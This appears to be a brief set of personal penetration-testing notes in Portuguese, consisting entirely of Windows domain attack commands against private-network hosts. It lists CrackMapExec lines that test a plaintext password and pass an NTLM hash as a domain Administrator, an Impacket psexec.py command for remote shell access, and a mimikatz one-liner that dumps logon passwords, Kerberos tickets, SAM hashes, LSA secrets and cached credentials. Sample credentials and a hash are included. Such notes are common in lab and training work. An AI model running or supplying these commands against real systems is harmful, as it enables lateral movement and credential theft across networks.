CRACKMAPEXEC
      - Testar usuário local: crackmapexec smb 192.168.98.2 -u john -p User1@#$%6 --local-auth
      - Testar usuário no domínio: crackmapexec smb 192.168.98.2 -u john -p User1@#$%6
      - Testar usuário passando o hash: crackmapexec smb 192.168.98.30 -u Administrator -H :69865e966bb089639e9b1c7f719427fa -d MGMT
IMPACKET
      - Tentar se conectar na máquina: /usr/share/doc/python3-impacket/examples/psexec.py 'child/john:User1@#$%6@192.168.98.30'

MIMIKATZ
      - Descobrir hashes e senhas: mimikatz.exe "privilege::debug" "Token::elevate" "sekurlsa::logonPasswords" "sekurlsa::tickets" "lsadump::sam" "lsadump::secret" "lsadump::cache" "exit"
